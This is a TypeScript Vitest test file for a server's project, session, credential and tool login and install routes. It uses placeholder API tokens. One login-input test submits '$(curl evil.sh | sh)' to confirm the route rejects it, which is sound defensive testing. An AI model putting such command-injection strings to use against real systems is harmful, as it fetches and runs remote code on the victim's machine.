import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import fs from 'node:fs/promises'
import path from 'node:path'
import { createTempDataDir, cleanupTempDir } from '@yaac/test-utils/setup'
import { buildApp } from '@yaac/server/server'
import simpleGit from 'simple-git'
import { projectConfigDir, getProjectsDir, projectDir, claudeDir, codexDir, repoDir } from '@yaac/shared/project-paths'
import { cloneRepo } from '@yaac/server/lib/git'
import { addEntry, loadCredentials } from '@yaac/server/lib/project/credentials'
import {
  loadClaudeCredentialsFile,
  saveClaudeOAuthBundle,
} from '@yaac/shared/tool-auth'
import { getDefaultTool } from '@yaac/server/lib/project/preferences'
import { closeDb } from '@yaac/server/lib/db/client'
import type * as projectAddModule from '@yaac/server/lib/project/add'
import type * as cliResolveModule from '@yaac/auth-daemon/cli-resolve'
import type { ProjectMeta, ClaudeOAuthBundle } from '@yaac/shared/types'
import { ServerError } from '@yaac/shared/errors'
import { makeTestRpcClient } from '@yaac/test-utils/rpc'

vi.mock('@yaac/server/session-create', () => ({
  createSession: vi.fn(),
}))

vi.mock('@yaac/server/lib/session/delete', () => ({
  deleteSession: vi.fn(),
}))

vi.mock('@yaac/server/lib/session/restart', () => ({
  restartSession: vi.fn(),
}))

vi.mock('@yaac/server/lib/project/add', async () => {
  const actual = await vi.importActual<typeof projectAddModule>('@yaac/server/lib/project/add')
  return {
    ...actual,
    addProject: vi.fn(),
  }
})

vi.mock('@yaac/server/lib/project/remove', () => ({
  removeProject: vi.fn(),
}))

// The install flow's post-exit verification resolves the CLI on the real
// machine — mocked so the route tests pass regardless of what's installed.
vi.mock('@yaac/auth-daemon/cli-resolve', async () => {
  const actual = await vi.importActual<typeof cliResolveModule>('@yaac/auth-daemon/cli-resolve')
  return {
    ...actual,
    resolveToolCliPath: () => '/fake/bin/tool',
  }
})

import { createSession } from '@yaac/server/session-create'
import { deleteSession } from '@yaac/server/lib/session/delete'
import { restartSession } from '@yaac/server/lib/session/restart'
import { addProject } from '@yaac/server/lib/project/add'
import { removeProject } from '@yaac/server/lib/project/remove'
import { registerProvisioning, listProvisioning, clearAllProvisioningForTests } from '@yaac/server/provisioning'
import { authAgentHub } from '@yaac/server/auth-agent'
import type { AgentOp } from '@yaac/shared/auth-agent-protocol'
import { CLAUDE_STUB, CODEX_STUB, INSTALL_STUB } from '@yaac/test-utils/fixtures'
import {
  cancelToolLogin,
  clearAllToolLoginsForTests,
  getToolLogin,
  sendToolLoginInput,
  startToolLogin,
} from '@yaac/auth-daemon/tool-login'
import {
  cancelToolInstall,
  clearAllToolInstallsForTests,
  getToolInstall,
  startToolInstall,
} from '@yaac/auth-daemon/tool-install'

/**
 * Wire an in-process "loopback" auth agent into the hub: ops dispatch to
 * the real local login/install managers and a pump pushes their views
 * back, so the routes get full end-to-end coverage without a WebSocket.
 * Returns a teardown that must run in afterEach.
 */
function installLoopbackAgent(): () => void {
  const tracked = new Map<string, 'login' | 'install'>()
  authAgentHub.setSocket({
    send: (data: string) => {
      const op = JSON.parse(data) as AgentOp
      if (op.op === 'start') {
        tracked.set(op.id, op.kind)
        if (op.kind === 'login') void startToolLogin(op.tool, op.id)
        else startToolInstall(op.tool, op.id)
      } else if (op.op === 'input') {
        try {
          sendToolLoginInput(op.id, op.text)
        } catch { /* surfaces via the next view push */ }
      } else {
        if (op.kind === 'login') cancelToolLogin(op.id)
        else cancelToolInstall(op.id)
        tracked.delete(op.id)
      }
    },
    close: () => {},
  })
  const pump = setInterval(() => {
    for (const [id, kind] of tracked) {
      try {
        const view = kind === 'login' ? getToolLogin(id) : getToolInstall(id)
        authAgentHub.ingest(JSON.stringify({ op: 'view', kind, view }))
        if (view.status !== 'running') tracked.delete(id)
      } catch {
        tracked.delete(id)
      }
    }
  }, 25)
  return () => {
    clearInterval(pump)
    authAgentHub.clearForTests()
  }
}

const mockCreateSession = vi.mocked(createSession)
const mockDeleteSession = vi.mocked(deleteSession)
const mockRestartSession = vi.mocked(restartSession)
const mockAddProject = vi.mocked(addProject)
const mockRemoveProject = vi.mocked(removeProject)

const SAMPLE_BUNDLE: ClaudeOAuthBundle = {
  accessToken: 'sk-ant-oat01-real',
  refreshToken: 'sk-ant-ort01-real',
  expiresAt: 9999999999999,
  scopes: ['user:inference'],
}

// Raw-request helper for the edge-case tests that intentionally send
// payloads the RPC client's type layer would reject (missing fields,
// malformed JSON, out-of-enum values).
function withAuth(init: RequestInit = {}): RequestInit {
  const headers = new Headers(init.headers ?? {})
  headers.set('authorization', 'Bearer shh')
  if (init.body !== undefined) headers.set('content-type', 'application/json')
  return { ...init, headers }
}

async function writeProject(slug: string): Promise<void> {
  const dir = path.join(getProjectsDir(), slug)
  await fs.mkdir(dir, { recursive: true })
  const meta: ProjectMeta = {
    slug,
    remoteUrl: 'https://example.com/foo',
    addedAt: '2026-01-01T00:00:00.000Z',
  }
  await fs.writeFile(path.join(dir, 'project.json'), JSON.stringify(meta))
}

describe('write routes', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await createTempDataDir()
    vi.resetAllMocks()
    clearAllProvisioningForTests()
  })

  afterEach(async () => {
    await closeDb()
    await cleanupTempDir(tmpDir)
  })

  describe('POST /project/add', () => {
    it('rejects requests with no body', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('rejects requests with a missing remoteUrl', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('delegates to addProject and returns 200 on success', async () => {
      mockAddProject.mockResolvedValue({
        project: { slug: 'foo', remoteUrl: 'https://github.com/x/foo', addedAt: 'now' },
      })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project.add.$post({ json: { remoteUrl: 'x/foo' } })
      expect(res.status).toBe(200)
      expect(mockAddProject).toHaveBeenCalledWith('x/foo')
    })
  })

  describe('DELETE /project/:slug', () => {
    it('delegates to removeProject and returns 204', async () => {
      mockRemoveProject.mockResolvedValue(undefined)
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].$delete({ param: { slug: 'demo' } })
      expect(res.status).toBe(204)
      expect(mockRemoveProject).toHaveBeenCalledWith('demo')
    })
  })

  describe('PUT /project/:slug/config', () => {
    it('rejects requests with no config field', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/demo/config', withAuth({
        method: 'PUT',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('writes the config and returns it', async () => {
      await writeProject('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].config.$put({
        param: { slug: 'demo' },
        json: { config: { envPassthrough: ['X'] } },
      })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ config: { envPassthrough: ['X'] } })
      const raw = await fs.readFile(
        path.join(projectConfigDir('demo'), 'yaac-config.json'),
        'utf8',
      )
      expect(JSON.parse(raw)).toEqual({ envPassthrough: ['X'] })
    })
  })

  describe('DELETE /project/:slug/config', () => {
    it('returns 204 when the project exists', async () => {
      await writeProject('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].config.$delete({ param: { slug: 'demo' } })
      expect(res.status).toBe(204)
    })

    it('returns 404 for an unknown project', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].config.$delete({ param: { slug: 'nope' } })
      expect(res.status).toBe(404)
    })
  })

  describe('project branches routes', () => {
    // A real repo behind the project: source with main + develop, cloned to
    // the project's repo dir so origin/* remote-tracking refs exist.
    async function writeProjectWithRepo(slug: string): Promise<string> {
      await writeProject(slug)
      const sourceRepo = path.join(getProjectsDir(), `${slug}-source`)
      await fs.mkdir(sourceRepo, { recursive: true })
      const git = simpleGit(sourceRepo)
      await git.raw(['init', '-b', 'main'])
      await git.addConfig('user.email', 't@t.co')
      await git.addConfig('user.name', 'T')
      await fs.writeFile(path.join(sourceRepo, 'a.txt'), 'a\n')
      await git.add('.')
      await git.commit('initial')
      await git.checkoutLocalBranch('develop')
      await git.checkout('main')
      await cloneRepo(sourceRepo, repoDir(slug), null)
      return sourceRepo
    }

    interface BranchesBody {
      branches: string[]
      defaultBranch: string
      referenceBranch: string | null
    }

    it('GET /project/:slug/branches lists branches with the default and reference branch', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({ param: { slug: 'demo' }, query: {} })
      expect(res.status).toBe(200)
      const body = await res.json() as BranchesBody
      expect(body.branches).toContain('main')
      expect(body.branches).toContain('develop')
      expect(body.defaultBranch).toBe('main')
      expect(body.referenceBranch).toBeNull()
    })

    it('GET /project/:slug/branches?refresh=1 fetches new branches first', async () => {
      const sourceRepo = await writeProjectWithRepo('demo')
      const git = simpleGit(sourceRepo)
      await git.checkoutLocalBranch('feature/late')
      await git.checkout('main')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({
        param: { slug: 'demo' },
        query: { refresh: '1' },
      })
      expect(res.status).toBe(200)
      expect((await res.json() as BranchesBody).branches).toContain('feature/late')
    })

    it('GET returns 404 for an unknown project', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({ param: { slug: 'nope' }, query: {} })
      expect(res.status).toBe(404)
    })

    it('PUT /project/:slug/reference-branch sets, reflects in GET, and clears with null', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))

      const set = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'demo' },
        json: { branch: 'develop' },
      })
      expect(set.status).toBe(200)
      expect(await set.json()).toEqual({ referenceBranch: 'develop' })

      const get = await client.project[':slug'].branches.$get({ param: { slug: 'demo' }, query: {} })
      expect((await get.json() as BranchesBody).referenceBranch).toBe('develop')

      const cleared = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'demo' },
        json: { branch: null },
      })
      expect(cleared.status).toBe(200)
      expect(await cleared.json()).toEqual({ referenceBranch: null })
    })

    it('PUT rejects a branch that does not exist on origin', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'demo' },
        json: { branch: 'no-such-branch' },
      })
      expect(res.status).toBe(400)
      const body = await res.json() as unknown as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('PUT returns 404 for an unknown project', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'nope' },
        json: { branch: 'develop' },
      })
      expect(res.status).toBe(404)
    })
  })

  describe('GET /project/:slug/dockerfile', () => {
    it('returns empty content when the project has none', async () => {
      await writeProject('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$get({ param: { slug: 'demo' } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: '' })
    })

    it('returns 404 for an unknown project', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$get({ param: { slug: 'nope' } })
      expect(res.status).toBe(404)
    })
  })

  describe('PUT /project/:slug/dockerfile', () => {
    it('rejects requests with no content field', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/demo/dockerfile', withAuth({
        method: 'PUT',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('writes the Dockerfile and returns it', async () => {
      await writeProject('demo')
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$put({
        param: { slug: 'demo' },
        json: { content: 'FROM ubuntu:24.04\n' },
      })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: 'FROM ubuntu:24.04\n' })
      const raw = await fs.readFile(
        path.join(projectConfigDir('demo'), 'Dockerfile.yaac'),
        'utf8',
      )
      expect(raw).toBe('FROM ubuntu:24.04\n')
    })
  })

  describe('GET/PUT /config/user-dockerfile', () => {
    it('returns empty content when unset', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.config['user-dockerfile'].$get()
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: '' })
    })

    it('writes a layered user Dockerfile and returns it', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const content = 'ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\nRUN echo hi\n'
      const res = await client.config['user-dockerfile'].$put({ json: { content } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content })
    })

    it('rejects a non-layered user Dockerfile with 400', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.config['user-dockerfile'].$put({
        json: { content: 'FROM ubuntu:24.04\n' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('POST /session/create', () => {
    it('rejects missing project', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/session/create', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects an unknown tool with VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/session/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', tool: 'mystery' }),
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('streams progress and a terminal result event from createSession', async () => {
      mockCreateSession.mockImplementation((_slug, opts) => {
        opts.onProgress?.('Fetching latest from remote...')
        opts.onProgress?.('Creating session job yaac-demo-sess-x...')
        return Promise.resolve({
          sessionId: 'sess-x',
          jobName: 'yaac-demo-sess-x',
          forwardedPorts: [],
          tool: 'claude',
        })
      })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.create.$post({
        json: {
          project: 'demo',
          gitUser: { name: 'A', email: 'a@b' },
        },
      })
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toBe('application/x-ndjson')
      const text = await res.text()
      const events = text.trim().split('\n').map((line) => JSON.parse(line) as unknown)
      expect(events).toEqual([
        { type: 'progress', message: 'Fetching latest from remote...' },
        { type: 'progress', message: 'Creating session job yaac-demo-sess-x...' },
        {
          type: 'result',
          result: {
            sessionId: 'sess-x',
            jobName: 'yaac-demo-sess-x',
            forwardedPorts: [],
            tool: 'claude',
          },
        },
      ])
      expect(mockCreateSession).toHaveBeenCalledWith('demo', expect.objectContaining({
        gitUser: { name: 'A', email: 'a@b' },
      }))
    })

    it('emits a terminal error event when createSession throws', async () => {
      mockCreateSession.mockRejectedValue(new ServerError('VALIDATION', 'no github token'))
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.create.$post({ json: { project: 'demo' } })
      expect(res.status).toBe(200)
      const events = (await res.text()).trim().split('\n').map((l) => JSON.parse(l) as unknown)
      expect(events).toEqual([
        { type: 'error', error: { code: 'VALIDATION', message: 'no github token' } },
      ])
    })

    it('threads a branch into createSession', async () => {
      mockCreateSession.mockResolvedValue({
        sessionId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude',
      })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.create.$post({ json: { project: 'demo', branch: 'dev' } })
      expect(res.status).toBe(200)
      await res.text()
      expect(mockCreateSession).toHaveBeenCalledWith('demo', expect.objectContaining({ branch: 'dev' }))
    })

    it('rejects an empty branch with VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/session/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', branch: '' }),
      }))
      expect(res.status).toBe(400)
    })

    it('threads a client-supplied sessionId into createSession', async () => {
      mockCreateSession.mockResolvedValue({
        sessionId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude',
      })
      const id = '11111111-1111-4111-8111-111111111111'
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.create.$post({ json: { project: 'demo', sessionId: id } })
      expect(res.status).toBe(200)
      await res.text()
      expect(mockCreateSession).toHaveBeenCalledWith('demo', expect.objectContaining({ sessionId: id }))
    })

    it('rejects a non-uuid sessionId with VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/session/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', sessionId: 'not-a-uuid' }),
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })
  })

  describe('POST /session/provisioning/:id/dismiss', () => {
    it('removes the registry entry and returns 204', async () => {
      registerProvisioning({ sessionId: 'dz-1', projectSlug: 'demo', tool: 'claude', kind: 'create' })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.provisioning[':id'].dismiss.$post({ param: { id: 'dz-1' } })
      expect(res.status).toBe(204)
      expect(listProvisioning().some((p) => p.sessionId === 'dz-1')).toBe(false)
    })

    it('is idempotent for an unknown id', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.provisioning[':id'].dismiss.$post({ param: { id: 'nope' } })
      expect(res.status).toBe(204)
    })
  })

  describe('POST /session/restart', () => {
    it('rejects missing sessionId', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/session/restart', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('streams progress and a result event from restartSession', async () => {
      mockRestartSession.mockImplementation((_id, opts) => {
        opts?.onProgress?.('Stopping session job yaac-demo-sess-x...')
        opts?.onProgress?.('Reusing existing worktree at /wt/sess-x')
        return Promise.resolve({
          sessionId: 'sess-x',
          jobName: 'yaac-demo-sess-x',
          forwardedPorts: [],
          tool: 'claude',
        })
      })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.restart.$post({
        json: {
          sessionId: 'sess-x',
          addDir: ['/tmp/ro'],
          gitUser: { name: 'A', email: 'a@b' },
        },
      })
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toBe('application/x-ndjson')
      const events = (await res.text()).trim().split('\n').map((line) => JSON.parse(line) as unknown)
      expect(events).toEqual([
        { type: 'progress', message: 'Stopping session job yaac-demo-sess-x...' },
        { type: 'progress', message: 'Reusing existing worktree at /wt/sess-x' },
        {
          type: 'result',
          result: {
            sessionId: 'sess-x',
            jobName: 'yaac-demo-sess-x',
            forwardedPorts: [],
            tool: 'claude',
          },
        },
      ])
      expect(mockRestartSession).toHaveBeenCalledWith('sess-x', expect.objectContaining({
        addDir: ['/tmp/ro'],
        gitUser: { name: 'A', email: 'a@b' },
      }))
    })

    it('emits a terminal error event when restartSession throws', async () => {
      mockRestartSession.mockRejectedValue(new ServerError('NOT_FOUND', 'missing'))
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.restart.$post({ json: { sessionId: 'nope' } })
      expect(res.status).toBe(200)
      const events = (await res.text()).trim().split('\n').map((l) => JSON.parse(l) as unknown)
      expect(events).toEqual([
        { type: 'error', error: { code: 'NOT_FOUND', message: 'missing' } },
      ])
    })
  })

  describe('POST /session/delete', () => {
    it('rejects missing sessionId', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/session/delete', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('delegates to deleteSession and returns the result', async () => {
      mockDeleteSession.mockResolvedValue({
        sessionId: 'sess-x',
        projectSlug: 'demo',
        jobName: 'yaac-demo-sess-x',
      })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.session.delete.$post({ json: { sessionId: 'sess-x' } })
      expect(res.status).toBe(200)
      expect(mockDeleteSession).toHaveBeenCalledWith('sess-x')
    })
  })

  describe('POST /tool/set', () => {
    it('rejects a missing tool field', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/tool/set', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects an unknown tool value with VALIDATION', async () => {
      // Schema accepts any string; setDefaultToolChecked does the enum
      // check and throws VALIDATION, so we can go through the typed client.
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.tool.set.$post({ json: { tool: 'gemini' } })
      expect(res.status).toBe(400)
      const body = await res.json() as unknown as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('persists the tool and returns the saved value', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.tool.set.$post({ json: { tool: 'codex' } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ tool: 'codex' })
      expect(await getDefaultTool()).toBe('codex')
    })
  })

  describe('POST /auth/clear', () => {
    it('rejects an unknown service', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/clear', withAuth({
        method: 'POST',
        body: JSON.stringify({ service: 'mystery' }),
      }))
      expect(res.status).toBe(400)
    })

    it('clears claude credentials when service=claude', async () => {
      await saveClaudeOAuthBundle(SAMPLE_BUNDLE)
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.clear.$post({ json: { service: 'claude' } })
      expect(res.status).toBe(204)
      expect(await loadClaudeCredentialsFile()).toBeNull()
    })
  })

  describe('POST /auth/git/credentials', () => {
    it('rejects a missing pattern', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/git/credentials', withAuth({
        method: 'POST',
        body: JSON.stringify({ kind: 'https', token: 'ghp_x' }),
      }))
      expect(res.status).toBe(400)
    })

    it('adds an https credential', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git.credentials.$post({
        json: { kind: 'https', pattern: 'github.com/acme/*', token: 'ghp_new' },
      })
      expect(res.status).toBe(204)
      expect((await loadCredentials()).tokens).toEqual([
        { kind: 'https', pattern: 'github.com/acme/*', token: 'ghp_new' },
      ])
    })

    it('surfaces invalid patterns as VALIDATION', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git.credentials.$post({
        json: { kind: 'https', pattern: '*', token: 'ghp_x' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('DELETE /auth/git/credentials/:pattern', () => {
    it('removes an existing credential', async () => {
      await addEntry({ kind: 'https', pattern: 'github.com/acme/*', token: 'ghp_acme' })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git.credentials[':pattern'].$delete({
        param: { pattern: encodeURIComponent('github.com/acme/*') },
      })
      expect(res.status).toBe(204)
      expect((await loadCredentials()).tokens).toEqual([])
    })

    it('returns 404 for an unknown pattern', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git.credentials[':pattern'].$delete({
        param: { pattern: 'unknown' },
      })
      expect(res.status).toBe(404)
    })
  })

  describe('PUT /auth/git/credentials', () => {
    it('replaces the entire credential list', async () => {
      await addEntry({ kind: 'https', pattern: 'github.com/old/*', token: 'ghp_old' })
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git.credentials.$put({
        json: { credentials: [{ kind: 'https', pattern: 'github.com/new/*', token: 'ghp_new' }] },
      })
      expect(res.status).toBe(204)
      expect((await loadCredentials()).tokens).toEqual([
        { kind: 'https', pattern: 'github.com/new/*', token: 'ghp_new' },
      ])
    })

    it('rejects non-array body', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/git/credentials', withAuth({
        method: 'PUT',
        body: JSON.stringify({ credentials: 'no' }),
      }))
      expect(res.status).toBe(400)
    })
  })

  describe('PUT /auth/:tool', () => {
    it('persists a claude api-key payload', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth[':tool'].$put({
        param: { tool: 'claude' },
        json: { kind: 'api-key', apiKey: 'sk-ant-api03-new' },
      })
      expect(res.status).toBe(204)
      const entry = await loadClaudeCredentialsFile()
      expect(entry?.kind).toBe('api-key')
    })

    it('rejects an unknown tool', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/gemini', withAuth({
        method: 'PUT',
        body: JSON.stringify({ kind: 'api-key', apiKey: 'x' }),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects api-key payloads with empty apiKey', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth[':tool'].$put({
        param: { tool: 'claude' },
        json: { kind: 'api-key', apiKey: '' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('tool login routes', () => {
    let teardownAgent: () => void

    beforeEach(() => {
      teardownAgent = installLoopbackAgent()
      process.env.YAAC_E2E_CODEX_LOGIN_CLI = JSON.stringify([process.execPath, CODEX_STUB])
      process.env.YAAC_E2E_CLAUDE_LOGIN_CLI = JSON.stringify([process.execPath, CLAUDE_STUB])
    })

    afterEach(() => {
      teardownAgent()
      clearAllToolLoginsForTests()
      delete process.env.YAAC_E2E_CODEX_LOGIN_CLI
      delete process.env.YAAC_E2E_CLAUDE_LOGIN_CLI
      delete process.env.FAKE_LOGIN_MODE
    })

    it('returns AUTH_AGENT_DISCONNECTED (503) when no auth server is connected', async () => {
      teardownAgent() // drop the loopback agent for this case
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
      expect(res.status).toBe(503)
      const body = await res.json() as unknown as { error: { code: string; message: string } }
      expect(body.error.code).toBe('AUTH_AGENT_DISCONNECTED')
      expect(body.error.message).toMatch(/yaac auth (update|server start)/)
      teardownAgent = installLoopbackAgent() // restore for afterEach symmetry
    })

    it('reports agent connectivity on GET /auth/agent', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const connectedRes = await client.auth.agent.$get()
      expect(await connectedRes.json()).toEqual({ connected: true })
      teardownAgent()
      const disconnectedRes = await client.auth.agent.$get()
      expect(await disconnectedRes.json()).toEqual({ connected: false })
      teardownAgent = installLoopbackAgent()
    })

    it('start → poll → success over the wire', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'codex' } })
      if (!startRes.ok) throw new Error('login start failed')
      const started = await startRes.json()
      expect(started.tool).toBe('codex')

      await vi.waitFor(async () => {
        const res = await client.auth.login[':id'].$get({ param: { id: started.id } })
        expect(res.status).toBe(200)
        expect((await res.json()).status).toBe('success')
      }, { timeout: 10_000, interval: 50 })
    })

    it('rejects starting a login for opencode', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/opencode/login/start', withAuth({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('rejects non-code input as VALIDATION through the route', async () => {
      process.env.FAKE_LOGIN_MODE = 'need-input'
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
      if (!startRes.ok) throw new Error('login start failed')
      const started = await startRes.json()

      const res = await client.auth.login[':id'].input.$post({
        param: { id: started.id },
        json: { text: '$(curl evil.sh | sh)' },
      })
      expect(res.status).toBe(400)
      const body = await res.json() as unknown as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('404s polling or feeding input to an unknown session; cancel is a no-op 204', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const get = await client.auth.login[':id'].$get({ param: { id: 'nope' } })
      expect(get.status).toBe(404)
      const input = await client.auth.login[':id'].input.$post({ param: { id: 'nope' }, json: { text: 'x' } })
      expect(input.status).toBe(404)
      const cancel = await client.auth.login[':id'].cancel.$post({ param: { id: 'nope' } })
      expect(cancel.status).toBe(204)
    })
  })

  describe('tool install routes', () => {
    let teardownAgent: () => void

    beforeEach(() => {
      teardownAgent = installLoopbackAgent()
      process.env.YAAC_E2E_CLAUDE_INSTALL_CLI = JSON.stringify([process.execPath, INSTALL_STUB])
    })

    afterEach(() => {
      teardownAgent()
      clearAllToolInstallsForTests()
      delete process.env.YAAC_E2E_CLAUDE_INSTALL_CLI
    })

    it('start → poll → success over the wire', async () => {
      const client = makeTestRpcClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const startRes = await client.auth[':tool'].install.start.$post({ param: { tool: 'claude' } })
      if (!startRes.ok) throw new Error('install start failed')
      const started = await startRes.json()
      expect(started.tool).toBe('claude')

      await vi.waitFor(async () => {
        const res = await client.auth.install[':id'].$get({ param: { id: started.id } })
        expect(res.status).toBe(200)
